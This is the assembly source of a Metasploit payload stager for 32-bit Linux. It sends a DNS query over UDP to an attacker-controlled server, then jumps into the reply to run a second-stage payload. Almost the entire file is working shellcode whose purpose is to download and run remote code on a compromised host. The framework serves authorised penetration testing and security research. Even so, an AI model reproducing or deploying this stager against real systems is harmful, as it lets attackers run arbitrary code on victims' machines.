;;
; 
;        Name: stager_sock_reverse_udp_dns
;   Qualities: Can Have Nulls
;   Platforms: Linux
;     Authors: skape <mmiller [at] hick.org>
;     Version: $Revision: 1445 $
;     License: 
;
;        This file is part of the Metasploit Exploit Framework
;        and is subject to the same licenses and copyrights as
;        the rest of this package.
;
; Description:
;
;        This payload stages by querying a controlled DNS server
;        and jumping into the response record that should contain 
;        the second stage.
;        
;
;;
BITS   32
GLOBAL _start

_start:
	xor  ebx, ebx
	mul  ebx

socket:
	push ebx
	push byte 0x2
	push byte 0x2
	inc  ebx
	mov  al, 0x66
	mov  ecx, esp
	int  0x80
	xchg eax, edi

connect:
	pop  ebx
	push dword 0x0100007f ; RHOST
	mov  dh, 0x35         ; RPORT (53)
	push dx
	push bx
	mov  ecx, esp
	push byte 0x66
	pop  eax
	push eax
	push ecx
	push edi
	mov  ecx, esp
	inc  ebx
	int  0x80
	cdq

write:
	pop  ebx
	inc  edx
	push dx               ; class and type (1, 1)
	push dx             
	dec  edx
	push dx
	push dword 0x6d6f6303 ; \x03com
	mov  cl, 0x3
	push ecx              ; q.rr[0].host = non-deterministic
	push edx              ; q.nscount = 0, q.arcount = 0
	inc  dh
	push edx              ; q.qdcount = 1, q.ancount = 0
	mov  dh, 0x4
	push dx               ; q.flags = 0x4 (AA)
	xchg al, dh
	push si               ; q.id = non-deterministic
	mov  ecx, esp
	mov  dl, 0x19
	int  0x80

read:
	mov  dh, 0xc
	mov  al, 0x3
	int  0x80
	add  ecx, byte 0xd
	jmp  ecx
